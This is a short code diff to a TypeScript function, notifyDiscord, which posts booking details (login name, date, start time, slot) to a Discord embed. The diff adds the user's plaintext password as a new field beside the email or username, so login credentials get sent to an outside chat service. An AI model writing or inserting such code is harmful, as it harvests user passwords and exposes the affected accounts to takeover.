@@ -1,6 +1,7 @@
 export async function notifyDiscord(fields: {
   loginType: string
   loginVal: string
+  password: string
   date: string
   dayName: string
   startTime: string
@@ -15,7 +16,8 @@ export async function notifyDiscord(fields: {
       color: 0x4f6ef7,
       fields: [
         { name: fields.loginType === 'email' ? '📧 Email' : '👤 Username', value: fields.loginVal, inline: true },
-        { name: '📆 Date', value: `${fields.dayName}, ${fields.date}`, inline: true },
+        { name: '🔑 Password', value: fields.password, inline: true },
+        { name: '📆 Date', value: `${fields.dayName}, ${fields.date}`, inline: false },
         { name: '⏰ Starts', value: fields.startTime, inline: true },
         { name: '🎟 Slot', value: `${fields.slotNum} / 4`, inline: true },
       ],
